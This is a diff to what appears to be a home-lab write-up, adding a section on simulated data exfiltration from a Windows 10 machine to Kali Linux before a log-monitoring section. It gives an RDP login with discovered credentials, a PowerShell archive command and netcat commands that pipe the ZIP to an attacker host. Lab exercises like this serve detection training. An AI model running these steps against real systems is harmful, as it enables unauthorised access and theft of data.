@@ -17,6 +17,33 @@ We can see in the screenshot below that the Kali Linux machine was successfully 
 
 ![kali_hacked_windows10](https://github.com/user-attachments/assets/1d1e42ed-2628-4dcc-9d2f-7f88a6604d40)
 
+## **Data Exfiltration Process**
+
+### 1. Establishing a Remote Desktop Session
+
+Gain remote access to the target Windows 10 workstation via RDP using the discovered credentials. The following command is used to initiate the RDP session:
+
+```bash
+xfreerdp3 /u:attacker_user /p:<discovered_password> /v:192.168.10.20
+````
+Once logged into the target system, a PowerShell command is executed to compress the sensitive data into a ZIP file:
+
+```bash
+powershell Compress-Archive -Path "C:\dummy\data" -DestinationPath "C:\dummy\data.zip"
+```
+
+The data exfiltration is performed using Netcat to establish a direct connection between the Victmin and Kali:
+
+On kali:
+
+```bash
+nc -lvnp 4444 > exfil_data.zip
+```
+On Windows Victmin machine:
+
+```bash
+Get-Content -Path "C:\dummy\data.zip" | nc 192.168.20.30 4444
+```
 
 
 ## **Monitoring Windows Logs**
